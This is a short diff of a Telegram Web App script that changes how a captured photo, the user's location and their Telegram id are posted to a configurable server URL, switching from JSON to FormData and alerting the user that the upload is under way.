@@ -185,26 +185,26 @@
         const params = new URLSearchParams(window.location.search);
         const SERVER_URL = params.get("server_url");
 
-        fetch(SERVER_URL, {
-          method: "POST",
-          mode: "no-cors",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: tg.initDataUnsafe.user.id,
-            photo: base64,
-            location: lastLocation,
-          }),
-        });
-
-        // const form = new FormData();
-        // form.append("chat_id", tg.initDataUnsafe.user.id);
-        // form.append("photo", base64);
-        // form.append("location", JSON.stringify(lastLocation));
-
         // fetch(SERVER_URL, {
         //   method: "POST",
-        //   body: form,
+        //   mode: "no-cors",
+        //   headers: { "Content-Type": "application/json" },
+        //   body: JSON.stringify({
+        //     chat_id: tg.initDataUnsafe.user.id,
+        //     photo: base64,
+        //     location: lastLocation,
+        //   }),
         // });
+
+        const form = new FormData();
+        form.append("chat_id", tg.initDataUnsafe.user.id);
+        form.append("photo", base64);
+        form.append("location", JSON.stringify(lastLocation));
+
+        fetch(SERVER_URL, {
+          method: "POST",
+          body: form,
+        });
 
         tg.showAlert("📤 Foto & lokasi sedang dikirim...");
         setTimeout(() => tg.sendData("ok"), 2000);
